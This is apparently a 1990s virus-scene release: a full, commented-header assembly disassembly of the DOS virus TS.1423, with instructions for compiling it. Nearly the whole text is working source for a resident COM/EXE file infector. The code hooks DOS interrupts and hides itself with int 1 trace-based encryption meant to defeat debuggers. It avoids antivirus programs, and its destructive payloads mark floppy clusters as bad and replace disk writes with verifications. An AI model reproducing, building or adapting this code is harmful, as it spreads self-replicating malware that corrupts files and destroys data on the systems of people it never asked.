   ; TS.1423
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ>
   ;                                                 Virus disassembly by Tcp
   ;
   ; Virus : TS.1423
   ; Author: Unknown
   ; Where : Spain
   ;
   ; This is a pretty  curious  virus i disassembled a few time ago, when 29A
   ; wasn't more than a project :) It's well  programmed and its best feature
   ; is the encryption routine, based  on  tracing  the code via int 1, which
   ; makes the  virus  decryption  and disassembly quite difficult. About the
   ; rest of the virus, just a little mention about the UMB residency and the
   ; payloads (nothing special). I'd describe it as follows:
   ;
   ;      þ Infects COM and EXE files on closing (3eh)
   ;      þ Encrypted; uses a decryption routine via int 1
   ;      þ Thus, highly antidebugging :)
   ;      þ It doesn't infect *AN*.* (Scan, TbScan...)
   ;      þ Marks clusters as bad on floppies if the year is above 1995
   ;      þ On friday, if the year is above 1995, changes disk writes to disk
   ;        verifications
   ;
   ; Btw... this source code was fully commented in spanish, but i'm too lazy
   ; to translate it and it's easy  to understand, so i'll leave it uncommen-
   ; ted; if you have any doubt  about it, look for me in #virus or e-mail me
   ; at tcp@cryogen.com.
   ;
   ; Compiling instructions:
   ;
   ; tasm /m ts1423.asm
   ; tlink ts1423.obj
   ; exe2bin ts1423.exe ts1423.com


   _bytes          equ     (header-start)+(_length-start)-(end_decr-start)
   _parag          equ     _bytes/16+1

   ts1423          segment byte public
                   assume  cs:ts1423, ds:ts1423
                   org     0

   start:          call    get_delta

   _mask           db      0

   int_1:          xor     byte ptr cs:[di],0aah
                   mov     bp,sp
                   mov     di,[bp]
                   xor     byte ptr cs:[di],0aah
                   iret

   get_delta:      pop     si
                   pushf
                   push    ds
                   push    es
                   pushf
                   xor     ax,ax
                   mov     ds,ax
                   mov     ax,si
                   inc     ax
                   mov     ds:[0004],ax
                   mov     ds:[0006],cs
                   mov     bp,sp
                   pushf
                   xor     byte ptr [bp-1],1
                   mov     di,si
                   add     di,offset end_decr-2
                   popf
                   mov     ah,cs:[si]

          ; First byte, encrypted with aah ; Decrypted instruction ;
          ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ ;
          ;                                ³                       :
                   db      29h,0eeh,3      ; sub   si,3 -> offset int_1
                   db      21h,0d6h        ; mov   dx,si
                   db      13h
                   dw      offset _length-offset end_decr ; mov   cx,offset...
                   db      2bh,0c6h
                   dw      offset end_decr ; add   si,offset end_decr
                   db      56h             ; cld
   loop_1:         db      84h,30h,24h     ; xor   cs:[si],ah ; Second routine
                   db      0ech            ; inc   si
                   db      48h,0fah        ; loop  loop_1
   end_decr:       db      37h             ; popf -> trace off (int_1 inactive)

                   mov     si,dx
                   cmp     cs:[si+file_type],0
                   je      com_file
                   mov     ax,cs
                   add     cs:[si+file_cs],ax
                   mov     ax,cs:[si+file_cs]
                   add     cs:[si+file_ss],ax

   com_file:       mov     bx,'TC'
                   mov     ax,'0.'
                   int     21h
                   or      ax,ax
                   jne     no_resident
                   jmp     no_activation

   no_resident:    cmp     al,5
                   jb      no_UMB
                   mov     ax,5800h
                   int     21h

                   push    ax
                   mov     ax,5802h
                   int     21h

                   push    ax
                   xor     dx,dx
                   mov     ax,5803h
                   mov     bx,1
                   int     21h

                   jc      UMB_error
                   mov     ax,5801h
                   mov     bx,81h
                   int     21h

                   jc      UMB_error
                   mov     bx,_parag
                   mov     ah,48h
                   int     21h

                   jc      UMB_error
                   mov     dx,ax

   UMB_error:      pop     bx
                   xor     bh,bh
                   mov     ax,5803h
                   int     21h

                   pop     bx
                   xor     bh,bh
                   mov     ax,5801h
                   int     21h

                   mov     ax,dx
                   or      ax,ax
                   jnz     mem_ok

   no_UMB:         mov     ax,es
                   dec     ax
                   mov     ds,ax
                   mov     bx,ds:[0003]
                   sub     bx,_parag+1
                   mov     ah,4ah
                   int     21h

                   mov     bx,_parag
                   mov     ah,48h
                   int     21h

   mem_ok:         mov     es,ax
                   dec     ax
                   mov     ds,ax
                   mov     ah,2ah
                   int     21h

                   mov     es:year,cl
                   cmp     cl,0cah
                   ja      y_1995
                   xor     al,al

   y_1995:         push    ax
                   mov     word ptr ds:[0001],8
                   push    si
                   push    cs
                   pop     ds
                   xor     di,di
                   mov     cx,offset _length
                   rep     movsb
                   pop     si
                   mov     dx,es
                   mov     ds,dx
                   mov     ax,3521h
                   int     21h

                   mov     ds:ofs_int21,bx
                   mov     ds:seg_int21,es
                   mov     es,dx
                   mov     dx,offset int_21
                   mov     ax,2521h
                   int     21h

                   pop     ax
                   cmp     al,5
                   jne     no_activation
                   push    es

                   mov     ax,3513h
                   int     21h

                   mov     ds:ofs_int13,bx
                   mov     ds:seg_int13,es
                   pop     es
                   mov     dx,offset int_13
                   mov     ax,2513h
                   int     21h

   no_activation:  pop     es
                   pop     ds
                   cmp     cs:[si+file_type],0
                   je      exec_com

                   popf
                   cli
                   mov     ss,cs:[si+file_ss]
                   mov     sp,cs:[si+file_sp]
                   sti
                   xor     ax,ax
                   xor     bx,bx
                   xor     cx,cx
                   xor     dx,dx
                   xor     si,si
                   xor     di,di
                   xor     bp,bp

                   db      0eah
   file_ip         dw      0
   file_cs         dw      0

   exec_com:       popf
                   add     si,offset bytes_com
                   mov     di,100h
                   push    di
                   mov     cx,3
                   rep     movsb
                   ret

   int_21:         cmp     ah,30h
                   je      get_OS
                   cmp     ah,57h
                   je      f_date
                   cmp     ah,3ch
                   je      open_functions
                   cmp     ah,5bh
                   je      open_functions
                   cmp     ah,3dh
                   je      open_functions
                   cmp     ah,6ch
                   je      open_functions
                   cmp     ah,3eh
                   je      close
                   cmp     ah,4bh
                   je      exec

   jmp_21:         jmp     dword ptr cs:ofs_int21

   call_21:        pushf
                   call    dword ptr cs:ofs_int21

   int_ret:        push    bp
                   mov     bp,sp
                   jc      put_error
                   and     byte ptr [bp+6],0FEh
                   pop     bp
                   iret

   put_error:      or      byte ptr [bp+6],1
                   pop     bp
                   iret

   get_OS:         cmp     al,'.'
                   jne     jmp_21
                   cmp     bx,'TC'
                   jne     jmp_21
                   xor     ax,ax
                   iret

   f_date:         or      al,al
                   jz      jmp_21
                   xor     al,al
                   push    cx
                   push    dx
                   pushf
                   call    dword ptr cs:ofs_int21
                   jc      error_g_date

                   and     cx,1fh
                   cmp     cx,1fh
                   pop     dx
                   pop     cx
                   mov     al,1
                   jnz     jmp_jmp21
                   or      cx,1fh

   jmp_jmp21:      jmp     jmp_21

   error_g_date:   pop     dx
                   pop     cx
                   jmp     int_ret

   open_functions: call    mark_bad
                   call    valid_name
                   jc      jmp_21
                   pushf
                   call    dword ptr cs:ofs_int21
                   jc      int_ret

                   mov     cs:handle,ax
                   jmp     int_ret

   close:          cmp     cs:handle,bx
                   jne     jmp_21
                   pushf
                   call    dword ptr cs:ofs_int21
                   jc      int_ret
                   jmp     infection

   exec:           call    valid_name
                   jc      jmp_jmp21_2
                   jmp     infection

   jmp_jmp21_2:    jmp     jmp_21

   infection:      push    ax
                   push    bx
                   push    cx
                   push    dx
                   push    si
                   push    di
                   push    ds
                   push    es
                   push    cs
                   pop     ds
                   mov     dx,offset file_name
                   call    get_drive
                   mov     ah,36h
                   int     21h

                   cmp     ax,0ffffh
                   je      jmp_end_infect

                   mul     bx
                   mul     cx
                   or      dx,dx
                   jnz     space
                   cmp     ax,offset _length
                   jae     space

   jmp_end_infect: jmp     end_infect

   space:          mov     ax,3524h
                   int     21h

                   mov     cs:ofs_int24,bx
                   mov     cs:seg_int24,es
                   push    cs
                   pop     es
                   mov     dx,offset int_24
                   mov     ax,2524h
                   int     21h

                   mov     dx,offset file_name
                   mov     ax,4300h
                   int     21h

                   jc      jmp_set_24
                   mov     cs:file_attribs,cx
                   xor     cx,cx
                   mov     ax,4301h
                   int     21h
                   jnc     open_file

   jmp_set_24:     jmp     set_24

   open_file:      mov     ax,3d02h
                   pushf
                   call    dword ptr cs:ofs_int21
                   jnc     file_opened
                   jmp     set_attribs

   file_opened:    mov     bx,ax
                   call    get_datetime
                   jc      jmp_jmp_close

                   call    lseek_end
                   jc      jmp_jmp_close
                   mov     si,ax
                   mov     di,dx
                   or      dx,dx
                   jnz     valid_length
                   cmp     ax,offset _length
                   jb      jmp_jmp_close

   valid_length:   call    lseek_start
                   jc      jmp_jmp_close
                   mov     cx,1ch
                   mov     dx,offset header
                   mov     ah,3fh
                   int     21h

                   jc      jmp_jmp_close
                   push    di
                   mov     di,dx
                   cmp     word ptr [di],'ZM'
                   pop     di
                   jz      exe_infect

                   mov     cs:file_type,0
                   sub     si,3
                   mov     cs:jmp_offset,si
                   add     si,offset _length+3
                   jc      jmp_jmp_close
                   mov     si,dx
                   mov     di,offset bytes_com
                   mov     cx,3
                   cld
                   rep     movsb
                   jmp     exe_com

   exe_infect:     mov     cs:file_type,1
                   cmp     cs:hdrsize,0
                   jne     no_hdr_0

   jmp_jmp_close:  jmp     jmp_close_file

   no_hdr_0:       mov     ax,cs:exe_sp
                   mov     cs:file_sp,ax
                   mov     ax,cs:relo_ss
                   mov     cs:file_ss,ax
                   mov     ax,cs:exe_ip
                   mov     cs:file_ip,ax
                   mov     ax,cs:relo_cs
                   mov     cs:file_cs,ax
                   sub     cs:file_ss,ax
                   mov     ax,cs:page_cnt
                   cmp     cs:part_pag,0
                   je      no_sub
                   dec     ax

   no_sub:         mov     cx,200h
                   mul     cx
                   add     ax,cs:part_pag
                   adc     dx,0
                   cmp     ax,si
                   jne     jmp_jmp_close
                   cmp     dx,di
                   jne     jmp_jmp_close
                   push    ax
                   push    dx
                   add     ax,offset _length
                   adc     dx,0
                   mov     cx,200h
                   div     cx

                   or      dx,dx
                   jz      no_add
                   inc     ax

   no_add:         mov     cs:page_cnt,ax
                   mov     cs:part_pag,dx
                   pop     dx
                   pop     ax
                   mov     cx,10h
                   div     cx
                   mov     cs:exe_ip,dx
                   sub     ax,cs:hdrsize
                   mov     cs:relo_cs,ax
                   sub     cs:file_cs,ax
                   mov     cs:relo_ss,ax
                   mov     cs:exe_sp,offset f_stack
                   call    lseek_start
                   jc      jmp_close_file

                   mov     cx,1ch
                   mov     dx,offset header
                   mov     ah,40h
                   int     21h
                   jc      jmp_close_file

   exe_com:        call    lseek_end
                   jc      jmp_close_file
                   push    es
                   xor     dx,dx
                   mov     es,dx
                   mov     ah,es:[046ch]
                   or      ah,ah
                   jnz     mask_no_0
                   mov     ah,43h

   mask_no_0:      mov     cs:_mask,ah
                   pop     es
                   mov     cx,offset end_decr
                   mov     ah,40h
                   int     21h
                   jnc     no_write_error

   jmp_close_file: jmp     close_file

   no_write_error: mov     ah,cs:_mask
                   mov     si,offset end_decr
                   mov     di,offset header
                   mov     cx,offset _length-offset end_decr
                   cld

   loop_encrypt:   lodsb
                   xor     al,ah
                   mov     [di],al
                   inc     di
                   loop    loop_encrypt

                   mov     cx,offset _length-offset end_decr
                   mov     dx,offset header
                   mov     ah,40h
                   int     21h

                   jc      set_date
                   cmp     cs:file_type,1
                   je      set_date
                   call    lseek_start
                   jc      set_date
                   mov     cx,3
                   mov     dx,offset jmp_op
                   mov     ah,40h
                   int     21h

   set_date:       call    set_datetime

   close_file:     mov     ah,3eh
                   pushf
                   call    dword ptr cs:ofs_int21

   set_attribs:    mov     dx,offset file_name
                   mov     cx,cs:file_attribs
                   mov     ax,4301h
                   int     21h

   set_24:         lds     dx,dword ptr cs:ofs_int24
                   mov     ax,2524h
                   int     21h

   end_infect:     pop     es
                   pop     ds
                   pop     di
                   pop     si
                   pop     dx
                   pop     cx
                   pop     bx
                   pop     ax
                   mov     cs:handle,0ffffh
                   cmp     ah,4bh
                   je      jmp_jmp21_3
                   clc
                   jmp     int_ret

   jmp_jmp21_3:    jmp     jmp_21

   int_24:         xor     al,al
                   iret

   int_13:         cmp     ah,3
                   jne     no_write
                   mov     ah,4

   no_write:       jmp     dword ptr cs:ofs_int13

   get_datetime:   push    ax
                   push    cx
                   push    dx
                   mov     ax,5700h
                   pushf
                   call    dword ptr cs:ofs_int21
                   jc      no_infect

                   mov     cs:file_date,dx
                   mov     cs:file_time,cx
                   and     cx,1fh
                   cmp     cx,1fh
                   je      no_infect
                   or      cs:file_time,1fh
                   jmp     end_getdate

   no_infect:      stc

   end_getdate:    pop     dx
                   pop     cx
                   pop     ax
                   ret

   set_datetime:   push    ax
                   push    cx
                   push    dx
                   mov     dx,cs:file_date
                   mov     cx,cs:file_time
                   mov     ax,5701h
                   pushf
                   call    dword ptr cs:ofs_int21
                   pop     dx
                   pop     cx
                   pop     ax
                   ret

   valid_name:     cmp     cs:handle,0ffffh
                   je      ready
                   stc
                   ret

   ready:          push    ax
                   push    si
                   push    di
                   cmp     ah,6ch
                   je      si_ok
                   mov     si,dx

   si_ok:          cld
                   mov     di,offset file_name

   next_letter:    lodsb
                   cmp     al,'a'
                   jb      no_lowercase
                   cmp     al,'z'
                   ja      no_lowercase
                   sub     al,20h

   no_lowercase:   mov     cs:[di],al
                   inc     di
                   or      al,al
                   jnz     next_letter
                   cmp     cs:[di-3],'MO'
                   jne     no_com_ext
                   cmp     cs:[di-5],'C.'
                   je      valid

   no_com_ext:     cmp     byte ptr cs:[di-6],'N'
                   je      no_valid
                   cmp     cs:[di-3],'EX'
                   jne     no_valid
                   cmp     cs:[di-5],'E.'
                   je      valid

   no_valid:       stc

   valid:          pop     di
                   pop     si
                   pop     ax
                   ret

   get_drive:      mov     di,dx
                   xor     dl,dl
                   cmp     byte ptr [di+1],':'
                   jne     default_drive
                   mov     dl,[di]
                   and     dl,1fh

   default_drive:  ret

   lseek_end:      mov     ax,4202h
                   xor     cx,cx
                   mov     dx,cx
                   int     21h
                   ret

   lseek_start:    mov     ax,4200h
                   xor     cx,cx
                   mov     dx,cx
                   int     21h
                   ret

   mark_bad:       cmp     cs:year,0cah
                   ja      activation
                   ret

   activation:     push    ax
                   push    bx
                   push    cx
                   push    dx
                   push    ds
                   push    es
                   push    di
                   cmp     ah,6ch
                   jne     no_extended
                   mov     dx,si

   no_extended:    call    get_drive
                   mov     al,dl
                   dec     al
                   cmp     al,0ffh
                   jne     with_drive
                   mov     ah,19h
                   int     21h

   with_drive:     cmp     al,1
                   ja      no_act
                   mov     byte ptr cs:file_attribs,al
                   push    cs
                   pop     ds
                   mov     al,byte ptr cs:file_attribs
                   mov     cx,1
                   xor     dx,dx
                   mov     bx,offset header
                   int     25h

                   add     sp,2
                   jc      no_act
                   mov     al,byte ptr cs:file_attribs
                   mov     dx,[bx+16h]
                   mov     cs:file_time,dx
                   mov     dx,[bx+0eh]
                   int     25h

                   add     sp,2
                   jc      no_act
                   mov     cx,200h
                   add     cx,bx
                   mov     di,bx

   next_cluster:   mov     ax,[di]
                   or      al,[di+2]
                   add     di,3
                   cmp     di,cx
                   jae     no_act
                   or      ax,ax
                   jnz     next_cluster

                   sub     di,3
                   mov     [di],7ff7h
                   mov     byte ptr [di+2],0ffh
                   mov     al,byte ptr cs:file_attribs
                   mov     cx,1
                   int     26h

                   add     sp,2
                   jc      no_act
                   mov     al,byte ptr cs:file_attribs
                   add     dx,cs:file_time
                   int     26h

                   add     sp,2

   no_act:         pop     di
                   pop     es
                   pop     ds
                   pop     dx
                   pop     cx
                   pop     bx
                   pop     ax
                   ret

   bytes_com:
   file_sp         dw      020cdh
   file_ss         dw      0
   file_type       db      0
   handle          dw      0
   jmp_op          db      0e9h

   _length:

   jmp_offset      dw      0
   ofs_int21       dw      0
   seg_int21       dw      0
   ofs_int24       dw      0
   seg_int24       dw      0
   ofs_int13       dw      0
   seg_int13       dw      0
   year            db      0
   file_attribs    dw      0
   file_date       dw      0
   file_time       dw      0
   file_name       db      65 dup (?)

   header:
   signature       dw      0
   part_pag        dw      0
   page_cnt        dw      0
   relo_cnt        dw      0
   hdrsize         dw      0
   minmem          dw      0
   maxmem          dw      0
   relo_ss         dw      0
   exe_sp          dw      0
   chksum          dw      0
   exe_ip          dw      0
   relo_cs         dw      0
                   dw      0
                   dw      0
   f_stack:

   ts1423          ends
                   end     start
